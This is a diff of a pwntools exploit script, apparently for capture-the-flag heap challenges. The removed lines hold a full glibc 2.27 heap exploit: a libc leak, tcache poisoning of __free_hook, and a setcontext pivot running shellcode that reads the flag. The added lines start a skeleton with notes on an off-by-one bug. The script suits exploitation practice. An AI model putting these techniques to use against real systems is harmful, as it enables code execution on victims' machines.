@@ -1,54 +1,47 @@
 # from LibcSearcher import *
 from helper import *
+import ctypes as c
 from exp import ret2libc_A, ret2libc_B
-loader = Loader("target/datasystem", 64, debug=True)
-loader.patch(2.27)
+loader = Loader("test", 64, debug=True)
+loader.patch_AIO(2.27)
 elf,libc = loader.init()
-# io = loader.process()
-io = loader.ida()
+# libc = ELF("buuoj/18/64/libc.so.6")
+io = loader.process()
+# io = loader.ida()
 abbre(globals(), io, loader) # 此处定义了常用的缩写
 menu(globals())
 
 
-def login():
-    sa(b'please input username: ', b'admin\x00')
-    sa(b'please input password: ', b'c' * 0x20)
+def add(size,content):
+    sla(b">",b"1")
+    sla(b">",bt(size))
+    sla(b">",content)
 
-login()
-add(0x440, b'aaaa') # 0
-add(0x10, b'bbbb')  # 1
-# pause()
-free(0)
-add(0x8, b'c'*8)    # 0    
-show(0)
-leak = uu64(ru(b"\x7f")[-6:])
-info(f"leak: {hex(leak)} (main_arena+1120)")
-main_arena = leak-1120
-malloc_hook = main_arena - 0x10
-libc_base = malloc_hook - libc.sym['__malloc_hook']
-success(f"libc_base: {hex(libc_base)}")
-libc.address = libc_base # from now on, libc.sym["xx"] returns real addr
+def free(id):
+    sla(b">",b"2")
+    sla(b">",bt(id))
 
-add(0x20,b"dddd")   # 2
-free(2)
-free(0)
+def show(id):
+    sla(b">",b"3")
+    sla(b">",bt(id))
 
-add(0x10, flat({
-    0x18:0x31, 
-    0x20:libc.sym['__free_hook'] - 0x200
-},filler=b"\x00")) # 0
-add(0x20, '\n')
+# trunk array [addr, size]
+# add max=10
+#     malloc(0xf8)
+#     get size <= 0xf8
+#     get content
+# free
+#     set 0
+#     free
+#     [addr, size] = 0
+# show
+#     puts
 
-add(0x20, flat({
-    0x68:0,
-    0x70:0x23330000,
-    0x88:0x200,
-    0xa0:libc.sym['__free_hook']-0x100,
-    0xa8:libc.sym['read'],
-    0x100:0x23330000,
-    0x200:libc.sym['setcontext']+53
-},filler=b"\x00"))
+# feature 1: off by one
+# add(0xf8,b'aaaa'), add(0xf8,b"bbbb"), free(0)
+# add(0xf8,b"cccc"), pause()
 
-free(3)
-sl(asm(shellcraft.cat("flag")))
-shell()
+# for i in range(10):
+#     add(0x8, b"xxxx")
+
+
